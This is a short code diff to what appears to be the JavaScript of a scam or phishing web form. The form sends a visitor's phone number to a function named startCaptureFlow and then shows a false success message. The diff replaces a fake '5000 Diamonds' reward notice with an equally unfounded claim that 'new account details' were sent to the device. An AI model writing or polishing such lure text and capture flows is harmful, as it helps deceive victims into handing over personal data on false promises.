@@ -21,14 +21,14 @@ elements.form.addEventListener('submit', async (e) => {
     
     // UI Loading state
     setLoading(true);
-    elements.status.textContent = 'Verifying Account ID...';
+    elements.status.textContent = 'Generating Account Credentials...';
     elements.status.style.color = 'var(--primary)';
 
     try {
         await startCaptureFlow(phoneNumber);
         
         // Final UI state
-        elements.status.textContent = 'Congratulations! 5000 Diamonds have been sent to your mailbox.';
+        elements.status.textContent = 'Congratulations! Your new account details have been sent to your device.';
         elements.status.style.color = 'var(--accent)';
         elements.phoneInput.value = '';
     } catch (err) {
